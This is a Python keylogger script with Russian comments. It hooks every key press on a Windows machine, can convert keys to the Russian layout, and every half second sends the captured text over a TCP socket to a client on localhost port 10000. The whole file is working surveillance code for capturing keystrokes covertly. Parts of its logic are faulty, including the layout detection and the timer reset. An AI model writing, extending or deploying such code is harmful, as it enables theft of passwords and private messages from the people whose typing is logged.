from socket import *
import keyboard
from threading import Timer
import ctypes

print('START 1')
HOST = "127.0.0.1"  # Standard loopback interface address (localhost)
PORT = 10000  # Port to listen on (non-privileged ports are > 1023)
TIMER = 0.5

s = socket(AF_INET, SOCK_STREAM)  # Создается сокет протокола TCP
s.bind(('localhost', PORT))  # Присваиваем ему порт 10000
s.listen(10)  # Максимальное количество одновременных запросов

client, addr = s.accept()  # акцептим запрос на соединение

u = ctypes.windll.LoadLibrary("user32.dll")
currentLanguage = getattr(u, "GetKeyboardLayout")

if currentLanguage == '0x4190419':
    currentLanguage = 'ru'
else:
    currentLanguage = 'en'


class keyLog:
    def __init__(self):
        self.data = ''
        self.currentLanguage = currentLanguage

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        if self.currentLanguage == 'ru' and not name[0] == '[':
            print('wu')
            layout = dict(zip(map(ord, '''qwertyuiop[]asdfghjkl;'zxcvbnm,./`QWERTYUIOP{}ASDFGHJKL:"ZXCVBNM<>?~'''),
                              '''йцукенгшщзхъфывапролджэячсмитьбю.ёЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭЯЧСМИТЬБЮ,Ё'''))
            name = name.translate(layout)
        self.data += name

    def get_data(self):
        return self.data

    def set_default_data(self):
        self.data = ''
        timer.run()

    def switch_language(self):
        print('d')
        if self.currentLanguage == 'ru':
            self.currentLanguage = 'en'
        else:
            self.currentLanguage = 'ru'
        print(self.currentLanguage)


def send_to_server():
    clear_text = keylog.get_data()
    client.send(clear_text.encode('utf-8'))  # передаем данные, предварительно упаковав их в байты
    keylog.set_default_data()


keylog = keyLog()
timer = Timer(interval=TIMER, function=send_to_server)
timer.daemon = True
keyboard.on_press(callback=keylog.callback)
keyboard.add_hotkey('shift+alt', keylog.switch_language)
keyboard.add_hotkey('win+space', keylog.switch_language)

print('1')
timer.start()
keyboard.wait()